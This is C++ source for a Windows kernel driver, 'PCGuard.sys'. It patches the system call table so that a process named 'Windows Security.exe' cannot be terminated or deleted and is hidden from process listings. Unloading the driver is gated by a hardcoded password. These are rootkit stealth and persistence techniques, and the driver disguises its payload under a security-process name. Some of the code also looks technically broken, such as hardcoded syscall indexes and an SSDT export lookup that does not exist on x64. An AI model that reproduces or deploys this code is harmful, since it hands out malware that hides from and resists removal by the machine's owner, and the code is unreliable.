/*
 * PCGuard.sys — PC Guardian Kernel Driver
 * Hooks NtTerminateProcess, NtDeleteFile, hides process from list
 * Build: WDK + Visual Studio (see build instructions)
 * Load: Test Signing Mode only (bcdedit /set testsigning on)
 *
 * Password: DECDRV — required to unload driver
 */

#include <ntddk.h>
#include <wdm.h>
#include "PCGuard.h"

// ── GLOBALS ──────────────────────────────────────────────────────────────────

DRIVER_OBJECT* g_DriverObject   = nullptr;
ULONG          g_ProtectedPID   = 0;
WCHAR          g_ProtectedName[] = L"Windows Security.exe";
WCHAR          g_Password[]      = L"DECDRV";
BOOLEAN        g_Hooked          = FALSE;

// Original function pointers (before hook)
typedef NTSTATUS (NTAPI* fnNtTerminateProcess)(HANDLE, NTSTATUS);
typedef NTSTATUS (NTAPI* fnNtDeleteFile)(POBJECT_ATTRIBUTES);
typedef NTSTATUS (NTAPI* fnNtQuerySystemInformation)(ULONG, PVOID, ULONG, PULONG);

fnNtTerminateProcess         g_OrigTerminateProcess        = nullptr;
fnNtDeleteFile               g_OrigDeleteFile              = nullptr;
fnNtQuerySystemInformation   g_OrigQuerySystemInformation  = nullptr;

// SSDT (System Service Descriptor Table) pointer
PULONG_PTR g_SSDT = nullptr;

// ── DEVICE ───────────────────────────────────────────────────────────────────

#define DEVICE_NAME     L"\\Device\\PCGuard"
#define SYMBOLIC_LINK   L"\\DosDevices\\PCGuard"

// IOCTL codes
#define IOCTL_SET_PID   CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_UNLOAD    CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

// ── SSDT HOOK HELPERS ─────────────────────────────────────────────────────────

ULONG GetSSDTIndex(LPCSTR funcName)
{
    // Read syscall index from ntdll in usermode image
    // We use hardcoded indexes for Win10/11 as fallback
    // NtTerminateProcess = 0x002C (Win10 21H2+)
    // NtDeleteFile       = 0x000D
    // NtQuerySystemInformation = 0x0036

    if (strcmp(funcName, "NtTerminateProcess") == 0)        return 0x002C;
    if (strcmp(funcName, "NtDeleteFile") == 0)              return 0x000D;
    if (strcmp(funcName, "NtQuerySystemInformation") == 0)  return 0x0036;
    return 0xFFFF;
}


PULONG_PTR GetSSDTBase()
{
    // Find SSDT via KeServiceDescriptorTable export
    UNICODE_STRING name;
    RtlInitUnicodeString(&name, L"KeServiceDescriptorTable");
    PULONG_PTR ksdt = (PULONG_PTR)MmGetSystemRoutineAddress(&name);
    if (!ksdt) return nullptr;
    return (PULONG_PTR)(*(PULONG_PTR)ksdt);
}


VOID DisableWriteProtect(ULONG_PTR* cr0)
{
    *cr0 = __readcr0();
    __writecr0(*cr0 & ~0x10000);  // Clear WP bit
    _disable();
}


VOID EnableWriteProtect(ULONG_PTR cr0)
{
    _enable();
    __writecr0(cr0);
}


// ── HOOKED FUNCTIONS ──────────────────────────────────────────────────────────

NTSTATUS NTAPI HookNtTerminateProcess(
    HANDLE   ProcessHandle,
    NTSTATUS ExitStatus
)
{
    if (ProcessHandle == NtCurrentProcess())
        return STATUS_ACCESS_DENIED;

    // Resolve PID of target handle
    PEPROCESS pTarget = nullptr;
    if (NT_SUCCESS(ObReferenceObjectByHandle(
        ProcessHandle, PROCESS_QUERY_INFORMATION,
        *PsProcessType, KernelMode,
        (PVOID*)&pTarget, nullptr)))
    {
        HANDLE targetPid = PsGetProcessId(pTarget);
        ObDereferenceObject(pTarget);

        if ((ULONG)(ULONG_PTR)targetPid == g_ProtectedPID)
        {
            DbgPrint("[PCGuard] Kill attempt on protected process BLOCKED (PID=%lu)\n",
                     g_ProtectedPID);
            return STATUS_ACCESS_DENIED;
        }
    }

    return g_OrigTerminateProcess(ProcessHandle, ExitStatus);
}


NTSTATUS NTAPI HookNtDeleteFile(POBJECT_ATTRIBUTES ObjectAttributes)
{
    if (ObjectAttributes && ObjectAttributes->ObjectName)
    {
        UNICODE_STRING* name = ObjectAttributes->ObjectName;
        // Check if file contains our exe name
        if (name->Buffer)
        {
            UNICODE_STRING checkName;
            RtlInitUnicodeString(&checkName, g_ProtectedName);

            // Simple substring check
            WCHAR* buf   = name->Buffer;
            USHORT len   = name->Length / sizeof(WCHAR);
            USHORT chklen = checkName.Length / sizeof(WCHAR);

            for (USHORT i = 0; i + chklen <= len; i++)
            {
                if (_wcsnicmp(buf + i, g_ProtectedName, chklen) == 0)
                {
                    DbgPrint("[PCGuard] Delete attempt on protected file BLOCKED\n");
                    return STATUS_ACCESS_DENIED;
                }
            }
        }
    }
    return g_OrigDeleteFile(ObjectAttributes);
}


// ── PROCESS HIDING ────────────────────────────────────────────────────────────

typedef struct _SYSTEM_PROCESS_INFORMATION {
    ULONG           NextEntryOffset;
    ULONG           NumberOfThreads;
    LARGE_INTEGER   Reserved[3];
    LARGE_INTEGER   CreateTime;
    LARGE_INTEGER   UserTime;
    LARGE_INTEGER   KernelTime;
    UNICODE_STRING  ImageName;
    KPRIORITY       BasePriority;
    HANDLE          UniqueProcessId;
    PVOID           InheritedFromUniqueProcessId;
    ULONG           HandleCount;
    ULONG           Reserved2[2];
    ULONG           PrivatePageCount;
    VM_COUNTERS     VirtualMemoryCounters;
    IO_COUNTERS     IoCounters;
    PVOID           Threads[0];
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;


NTSTATUS NTAPI HookNtQuerySystemInformation(
    ULONG  SystemInformationClass,
    PVOID  SystemInformation,
    ULONG  SystemInformationLength,
    PULONG ReturnLength
)
{
    NTSTATUS status = g_OrigQuerySystemInformation(
        SystemInformationClass, SystemInformation,
        SystemInformationLength, ReturnLength
    );

    // SystemProcessInformation = 5
    if (!NT_SUCCESS(status) || SystemInformationClass != 5)
        return status;

    if (!g_ProtectedPID || !SystemInformation)
        return status;

    // Walk process list and unlink our process
    PSYSTEM_PROCESS_INFORMATION curr =
        (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
    PSYSTEM_PROCESS_INFORMATION prev = nullptr;

    while (TRUE)
    {
        if ((ULONG)(ULONG_PTR)curr->UniqueProcessId == g_ProtectedPID)
        {
            DbgPrint("[PCGuard] Hiding PID %lu from query\n", g_ProtectedPID);
            if (prev)
            {
                if (curr->NextEntryOffset == 0)
                    prev->NextEntryOffset = 0;
                else
                    prev->NextEntryOffset += curr->NextEntryOffset;
            }
        }
        else
        {
            prev = curr;
        }

        if (curr->NextEntryOffset == 0) break;
        curr = (PSYSTEM_PROCESS_INFORMATION)(
            (ULONG_PTR)curr + curr->NextEntryOffset
        );
    }

    return status;
}


// ── INSTALL / REMOVE HOOKS ────────────────────────────────────────────────────

NTSTATUS InstallHooks()
{
    g_SSDT = GetSSDTBase();
    if (!g_SSDT)
    {
        DbgPrint("[PCGuard] Failed to get SSDT base\n");
        return STATUS_UNSUCCESSFUL;
    }

    ULONG_PTR cr0;
    DisableWriteProtect(&cr0);

    // Hook NtTerminateProcess
    ULONG idx = GetSSDTIndex("NtTerminateProcess");
    g_OrigTerminateProcess = (fnNtTerminateProcess)g_SSDT[idx];
    g_SSDT[idx] = (ULONG_PTR)HookNtTerminateProcess;

    // Hook NtDeleteFile
    idx = GetSSDTIndex("NtDeleteFile");
    g_OrigDeleteFile = (fnNtDeleteFile)g_SSDT[idx];
    g_SSDT[idx] = (ULONG_PTR)HookNtDeleteFile;

    // Hook NtQuerySystemInformation (for hiding)
    idx = GetSSDTIndex("NtQuerySystemInformation");
    g_OrigQuerySystemInformation = (fnNtQuerySystemInformation)g_SSDT[idx];
    g_SSDT[idx] = (ULONG_PTR)HookNtQuerySystemInformation;

    EnableWriteProtect(cr0);

    g_Hooked = TRUE;
    DbgPrint("[PCGuard] SSDT hooks installed\n");
    return STATUS_SUCCESS;
}


VOID RemoveHooks()
{
    if (!g_Hooked || !g_SSDT) return;

    ULONG_PTR cr0;
    DisableWriteProtect(&cr0);

    if (g_OrigTerminateProcess)
        g_SSDT[GetSSDTIndex("NtTerminateProcess")] = (ULONG_PTR)g_OrigTerminateProcess;
    if (g_OrigDeleteFile)
        g_SSDT[GetSSDTIndex("NtDeleteFile")] = (ULONG_PTR)g_OrigDeleteFile;
    if (g_OrigQuerySystemInformation)
        g_SSDT[GetSSDTIndex("NtQuerySystemInformation")] = (ULONG_PTR)g_OrigQuerySystemInformation;

    EnableWriteProtect(cr0);
    g_Hooked = FALSE;
    DbgPrint("[PCGuard] SSDT hooks removed\n");
}


// ── IOCTL HANDLER ─────────────────────────────────────────────────────────────

NTSTATUS HandleIoctl(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);

    PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(Irp);
    ULONG code    = stack->Parameters.DeviceIoControl.IoControlCode;
    ULONG inLen   = stack->Parameters.DeviceIoControl.InputBufferLength;
    PVOID inBuf   = Irp->AssociatedIrp.SystemBuffer;

    NTSTATUS status   = STATUS_SUCCESS;
    ULONG    bytesRet = 0;

    switch (code)
    {
        case IOCTL_SET_PID:
        {
            if (inLen >= sizeof(ULONG) && inBuf)
            {
                g_ProtectedPID = *(PULONG)inBuf;
                DbgPrint("[PCGuard] Protecting PID: %lu\n", g_ProtectedPID);
            }
            else
            {
                status = STATUS_INVALID_PARAMETER;
            }
            break;
        }

        case IOCTL_UNLOAD:
        {
            // Verify password before allowing unload
            if (inLen >= sizeof(WCHAR) * 6 && inBuf)
            {
                WCHAR* pw = (WCHAR*)inBuf;
                if (_wcsicmp(pw, g_Password) == 0)
                {
                    DbgPrint("[PCGuard] Correct password — unloading\n");
                    RemoveHooks();
                    // Signal unload by setting PID to 0
                    g_ProtectedPID = 0;
                }
                else
                {
                    DbgPrint("[PCGuard] Wrong password — unload denied\n");
                    status = STATUS_ACCESS_DENIED;
                }
            }
            else
            {
                status = STATUS_ACCESS_DENIED;
            }
            break;
        }

        default:
            status = STATUS_INVALID_DEVICE_REQUEST;
            break;
    }

    Irp->IoStatus.Status      = status;
    Irp->IoStatus.Information = bytesRet;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return status;
}


// ── DISPATCH FUNCTIONS ────────────────────────────────────────────────────────

NTSTATUS DispatchCreateClose(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(DeviceObject);
    Irp->IoStatus.Status      = STATUS_SUCCESS;
    Irp->IoStatus.Information = 0;
    IoCompleteRequest(Irp, IO_NO_INCREMENT);
    return STATUS_SUCCESS;
}


// ── DRIVER UNLOAD ─────────────────────────────────────────────────────────────

VOID DriverUnload(PDRIVER_OBJECT DriverObject)
{
    UNREFERENCED_PARAMETER(DriverObject);

    RemoveHooks();

    UNICODE_STRING symLink;
    RtlInitUnicodeString(&symLink, SYMBOLIC_LINK);
    IoDeleteSymbolicLink(&symLink);

    if (DriverObject->DeviceObject)
        IoDeleteDevice(DriverObject->DeviceObject);

    DbgPrint("[PCGuard] Driver unloaded\n");
}


// ── DRIVER ENTRY ──────────────────────────────────────────────────────────────

extern "C" NTSTATUS DriverEntry(
    PDRIVER_OBJECT  DriverObject,
    PUNICODE_STRING RegistryPath
)
{
    UNREFERENCED_PARAMETER(RegistryPath);
    DbgPrint("[PCGuard] Driver loading...\n");

    g_DriverObject = DriverObject;

    // Create device
    UNICODE_STRING devName;
    RtlInitUnicodeString(&devName, DEVICE_NAME);

    PDEVICE_OBJECT devObj = nullptr;
    NTSTATUS status = IoCreateDevice(
        DriverObject, 0, &devName,
        FILE_DEVICE_UNKNOWN,
        FILE_DEVICE_SECURE_OPEN,
        FALSE, &devObj
    );

    if (!NT_SUCCESS(status))
    {
        DbgPrint("[PCGuard] IoCreateDevice failed: 0x%X\n", status);
        return status;
    }

    // Create symbolic link
    UNICODE_STRING symLink;
    RtlInitUnicodeString(&symLink, SYMBOLIC_LINK);
    status = IoCreateSymbolicLink(&symLink, &devName);
    if (!NT_SUCCESS(status))
    {
        IoDeleteDevice(devObj);
        return status;
    }

    // Set dispatch routines
    DriverObject->DriverUnload = DriverUnload;
    for (int i = 0; i < IRP_MJ_MAXIMUM_FUNCTION; i++)
        DriverObject->MajorFunction[i] = DispatchCreateClose;
    DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = HandleIoctl;

    devObj->Flags |= DO_BUFFERED_IO;
    devObj->Flags &= ~DO_DEVICE_INITIALIZING;

    // Install SSDT hooks
    status = InstallHooks();
    if (!NT_SUCCESS(status))
    {
        DbgPrint("[PCGuard] Hook install failed — running without hooks\n");
    }

    DbgPrint("[PCGuard] Driver loaded successfully\n");
    return STATUS_SUCCESS;
}
